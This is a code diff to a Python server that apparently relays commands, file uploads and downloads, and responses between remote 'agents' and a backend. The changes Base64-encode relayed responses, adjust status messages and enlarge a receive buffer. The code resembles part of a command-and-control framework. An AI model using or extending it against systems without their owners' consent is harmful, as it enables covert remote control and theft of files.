@@ -1,6 +1,7 @@
 import socket
 import requests
 import threading
+import base64
 import json
 import os
 from database import Session, Agent  # Assuming the existence of a database handling module
@@ -110,7 +111,7 @@ def handle_download(agent_id, filename):
                     file.write(data)
                     received_size += len(data)
 
-            response=f"Download of '{filename}' from {agent_id} completed."
+            response=f"Download of '{filename}' completed."
             print(response)
             send_result_back_to_backend(response, agent_id)
         except ValueError:
@@ -145,6 +146,7 @@ def handle_upload(agent_id, filename):
                 # Wait for a confirmation response from the agent
                 response = agent_conn.recv(2048).decode()
                 if response.startswith("File Upload Successful"):
+                    response=f"Upload of '{filename}' complete."
                     send_result_back_to_backend(response, agent_id)
                     print(f"Upload of '{filename}' to agent {agent_id} complete.")
                 else:
@@ -217,7 +219,7 @@ def start_command_listener(ip, port):
 def receive_agent_response(conn, agent_id):
     '''Receives response from agent for the command sent.'''
     try:
-        response = conn.recv(2048).decode().strip()
+        response = conn.recv(4096).decode().strip()
         if response:
             print(f"Response received from Agent {agent_id}: {response}")
             # Here, you can process the response as needed (e.g., send it back to the backend)
@@ -228,10 +230,15 @@ def receive_agent_response(conn, agent_id):
         print(f"Error receiving response from Agent {agent_id}: {e}")
 
 def send_result_back_to_backend(response, agent_id):
-    global backend_connection  # Access the global variable
+    global backend_connection
     if backend_connection:
-        # Send the response back to the backend server
-        backend_connection.send(json.dumps({"agent_id": agent_id, "response": response}).encode())
+        try:
+            # Base64 encode the response to preserve exact formatting
+            encoded_response = base64.b64encode(response.encode('utf-8')).decode('utf-8')
+            data_to_send = json.dumps({"agent_id": agent_id, "response": encoded_response})
+            backend_connection.send(data_to_send.encode('utf-8'))
+        except Exception as e:
+            print(f"Failed to send response: {e}")
     else:
         print("Backend connection is not established.")
 
